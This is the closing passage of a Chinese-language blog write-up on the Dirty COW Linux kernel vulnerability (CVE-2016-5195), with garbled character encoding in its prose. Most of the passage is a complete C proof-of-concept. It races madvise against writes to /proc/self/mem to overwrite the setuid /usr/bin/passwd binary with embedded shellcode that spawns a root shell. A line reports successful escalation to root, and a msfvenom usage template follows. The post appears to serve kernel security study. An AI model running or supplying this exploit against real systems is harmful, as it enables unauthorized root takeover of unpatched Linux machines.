<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * CVE-2016-5195</span></span><br><span class="line"><span class="comment"> * dirty C-O-W</span></span><br><span class="line"><span class="comment"> * poc by arttnba3</span></span><br><span class="line"><span class="comment"> * 2021.4.14</span></span><br><span class="line"><span class="comment"> *  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">dst_st</span>, <span class="title">fk_st</span>;</span></span><br><span class="line"><span class="type">void</span> * <span class="built_in">map</span>;</span><br><span class="line"><span class="type">char</span> *fake_content;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sc[] = &#123;</span><br><span class="line">  <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x95</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xb2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x69</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>,</span><br><span class="line">  <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x99</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x5f</span>, <span class="number">0x52</span>, <span class="number">0x5e</span>,</span><br><span class="line">  <span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sc_len = <span class="number">149</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> write_thread, madvise_thread;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dst_fd, fk_fd;</span><br><span class="line">    dst_fd = open(<span class="string">&quot;/usr/bin/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of dst: %d\n&quot;</span>, dst_fd);</span><br><span class="line"></span><br><span class="line">    fstat(dst_fd, &amp;dst_st); <span class="comment">// get destination file length</span></span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, dst_st.st_size, PROT_READ, MAP_PRIVATE, dst_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;madvise_thread, <span class="literal">NULL</span>, madviseThread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;write_thread, <span class="literal">NULL</span>, writeThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(madvise_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(write_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> mm_fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of mem: %d\n&quot;</span>, mm_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lseek(mm_fd, (<span class="type">off_t</span>) <span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(mm_fd, sc, sc_len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">0x100</span>, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œï¼ŒæˆåŠŸææƒåˆ° root</p>
<p><img src="https://i.loli.net/2021/04/15/zy7V5Zu9AQdnREX.png" alt="image.png"></p>
<blockquote>
<p>msfvenom ä½¿ç”¨æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br></pre></td></tr></table></figure>
</blockquote>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2021/03/03/PWN-0X01-LINUX-KERNEL-PWN-PART-I/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>ä¸Šä¸€é¡µ</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime" title="æ›´æ–°æ—¶é—´"></i>
              2021-04-08 23:36:27
            </span>
            
                  <span class="post-categories">
                    <i class="iconfont icon-bookmark" title="åˆ†ç±»"></i>
                    
                    <span class="span--category">
                      <a href="/categories/CVE/" title="CVE">
                        <b>#</b> CVE
                      </a>
                    </span>
                    
                  </span>
              
                  <span class="post-tags">
                    <i class="iconfont icon-tags" title="æ ‡ç­¾"></i>
                    
                    <span class="span--tag">
                      <a href="/tags/Pwn/" title="Pwn">
                        <b>#</b> Pwn
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/CVE/" title="CVE">
                        <b>#</b> CVE
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Linux/" title="Linux">
                        <b>#</b> Linux
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E6%8F%90%E6%9D%83/" title="ææƒ">
                        <b>#</b> ææƒ
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Linux-Kernel/" title="Linux Kernel">
                        <b>#</b> Linux Kernel
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E8%84%8F%E7%89%9B/" title="è„ç‰›">
                        <b>#</b> è„ç‰›
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2021/04/24/CVE-0X01-CVE-2021-3156/" target="_self">
                <span>ä¸‹ä¸€é¡µ</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">ç›®å½•</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E4%B8%80%E5%88%87%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D"><span class="toc-text">0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%86%99%E6%97%B6%E5%A4%8D%E5%88%B6%E6%9C%BA%E5%88%B6%EF%BC%88Copy-on-Write%EF%BC%89"><span class="toc-text">ä¸€ã€å†™æ—¶å¤åˆ¶æœºåˆ¶ï¼ˆCopy-on-Writeï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#basic-COW"><span class="toc-text">basic COW</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mmap-%E4%B8%8E-COW"><span class="toc-text">mmap ä¸ COW</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8%EF%BC%88page-fault%EF%BC%89"><span class="toc-text">äºŒã€ç¼ºé¡µå¼‚å¸¸ï¼ˆpage faultï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-text">åˆ†ç±»</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E8%BD%AF%E6%80%A7%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8%EF%BC%88soft-page-fault%EF%BC%89"><span class="toc-text">â‘ è½¯æ€§ç¼ºé¡µå¼‚å¸¸ï¼ˆsoft page faultï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E7%A1%AC%E6%80%A7%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8%EF%BC%88hard-page-fault%EF%BC%89"><span class="toc-text">â‘¡ç¡¬æ€§ç¼ºé¡µå¼‚å¸¸ï¼ˆhard page faultï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E6%97%A0%E6%95%88%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8%EF%BC%88invalid-page-fault%EF%BC%89"><span class="toc-text">â‘¢æ— æ•ˆç¼ºé¡µå¼‚å¸¸ï¼ˆinvalid page faultï¼‰</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%84%E7%90%86%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8"><span class="toc-text">å¤„ç†ç¼ºé¡µå¼‚å¸¸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E5%A4%84%E7%90%86%EF%BC%9A-do-page-fault"><span class="toc-text">é¢„å¤„ç†ï¼š__do_page_fault()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E9%85%8D%E9%A1%B5%E8%A1%A8%E9%A1%B9%EF%BC%9A-handle-mm-fault"><span class="toc-text">åˆ†é…é¡µè¡¨é¡¹ï¼š__handle_mm_fault()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%84%E7%90%86%E9%A1%B5%E8%A1%A8%E9%A1%B9%EF%BC%9Ahandle-pte-fault"><span class="toc-text">å¤„ç†é¡µè¡¨é¡¹ï¼šhandle_pte_fault()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD%E7%89%A9%E7%90%86%E9%A1%B5%EF%BC%9Ado-fault"><span class="toc-text">æŒ‚è½½ç‰©ç†é¡µï¼šdo_fault()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%84%E7%90%86%E5%86%99%E6%97%B6%E5%A4%8D%E5%88%B6%EF%BC%88%E6%97%A0%E5%86%85%E5%AD%98%E9%A1%B5%EF%BC%89%EF%BC%9A-do-cow-fault"><span class="toc-text">å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæ— å†…å­˜é¡µï¼‰ï¼š do_cow_fault()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%84%E7%90%86%E5%86%99%E6%97%B6%E5%A4%8D%E5%88%B6%EF%BC%88%E6%9C%89%E5%86%85%E5%AD%98%E9%A1%B5%EF%BC%89%EF%BC%9Ado-wp-page"><span class="toc-text">å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæœ‰å†…å­˜é¡µï¼‰ï¼šdo_wp_page()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81COW-%E4%B8%8E-%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8%E7%9B%B8%E5%85%B3%E6%B5%81%E7%A8%8B"><span class="toc-text">ä¸‰ã€COW ä¸ ç¼ºé¡µå¼‚å¸¸ç›¸å…³æµç¨‹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%9Awrite%E3%81%AE%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-text">ç³»ç»Ÿè°ƒç”¨ï¼šwriteã®æ‰§è¡Œæµ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#x2F-proc-x2F-self-x2F-mem%EF%BC%9A%E7%BB%95%E8%BF%87%E9%A1%B5%E8%A1%A8%E9%A1%B9%E6%9D%83%E9%99%90"><span class="toc-text">&#x2F;proc&#x2F;self&#x2F;memï¼šç»•è¿‡é¡µè¡¨é¡¹æƒé™</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%A7%A6%E5%8F%91%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8"><span class="toc-text">ç¬¬ä¸€æ¬¡è§¦å‘ç¼ºé¡µå¼‚å¸¸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%A7%A6%E5%8F%91%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8"><span class="toc-text">ç¬¬äºŒæ¬¡è§¦å‘ç¼ºé¡µå¼‚å¸¸</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x01.æ¼æ´åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AB%9E%E4%BA%89"><span class="toc-text">å¤šçº¿ç¨‹ç«äº‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E6%AC%A1%E8%8E%B7%E5%8F%96%E5%86%85%E5%AD%98%E9%A1%B5-amp-%E4%B8%89%E6%AC%A1%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8"><span class="toc-text">å››æ¬¡è·å–å†…å­˜é¡µ &amp; ä¸‰æ¬¡ç¼ºé¡µå¼‚å¸¸</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">0x02.æ¼æ´åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-text">poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">ææƒ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%96%B0%E5%BB%BA-root-%E7%94%A8%E6%88%B7"><span class="toc-text">ä¸€ã€æ–°å»º root ç”¨æˆ·</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SUID-%E6%8F%90%E6%9D%83"><span class="toc-text">äºŒã€SUID ææƒ</span></a></li></ol></li></ol></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        




  
    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
  

  <div id="vcomments"></div>

  <script>
    function loadValineSuc() {
      new Valine({
        el: '#vcomments',
        appId: 'ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz',
        appKey: 'tuvJh3xYxPFcW2JB6K26RKP2',
        placeholder: 'è¯´ç‚¹ä»€ä¹ˆå‘—...',
        avatar: 'retro',
        lang: 'zh-CN'
      })
    }
  </script>

    <style>
      .comments-container .v .vempty {
        display: none!important;
      }
    </style>




      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/arttnba3">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
        <li>
          <a title="email" href="mailto:arttnba@gmail.com">
            <i class="iconfont icon-envelope"></i>
          </a>
        </li>
      
        <li>
          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/arttnba3">
            <i class="iconfont icon-twitter"></i>
          </a>
        </li>
      
        <li>
          <a title="rss" href="/atom.xml">
            <i class="iconfont icon-rss"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/arttnba3">Copyright Â© 2022 arttnba3</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="æœç´¢...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>é¦–æ¬¡æœç´¢ï¼Œæ­£åœ¨è½½å…¥ç´¢å¼•æ–‡ä»¶ï¼Œè¯·ç¨åâ€¦â€¦<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>æ²¡æœ‰æ‰¾åˆ°å†…å®¹ï¼Œè¯·å°è¯•æ›´æ¢æ£€ç´¢è¯ã€‚<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>æœªæ‰¾åˆ°search.xmlæ–‡ä»¶ï¼Œå…·ä½“è¯·å‚è€ƒï¼š<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>è¯·æ±‚å¤±è´¥ï¼Œå°è¯•é‡æ–°åˆ·æ–°é¡µé¢æˆ–ç¨åé‡è¯•ã€‚<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
